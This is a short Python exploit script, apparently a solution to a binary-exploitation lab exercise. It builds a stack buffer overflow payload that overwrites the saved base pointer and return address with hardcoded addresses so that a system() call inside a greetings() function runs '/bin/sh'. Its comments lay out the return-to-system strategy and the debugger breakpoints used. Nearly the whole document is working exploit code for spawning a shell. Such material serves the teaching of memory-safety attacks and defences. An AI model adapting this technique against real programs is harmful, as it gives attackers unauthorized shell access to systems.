from struct import pack
from shellcode import shellcode
import sys
sys.stdout.buffer.write(bytes.fromhex('41'*10)+ pack("<I", 0xfffeaa80) + bytes.fromhex('41'*4) + pack("<I",0xfffeaa88) + pack("<I", 0x08049d16) + pack("<I", 0xfffeaa90) + bytes.fromhex('41'*12) + b"/bin/sh")
#get binsh to be at end of null char (null in memory)
#dont jump to begining of system
#leverage something to adjust the stack
#return to a differnet instruction that puts /bin/sh 
#treatsystem as a black box, set stack accordingly
#b *0x08049d93 -- b *0x08049d4a

##solution
#overflow base pointer to point to right after return address
#overflow return address to point to system() call in greetings()
#after ret addr, put a pointer to futher area of memory that contains "/bin/sh" with \00 at the end
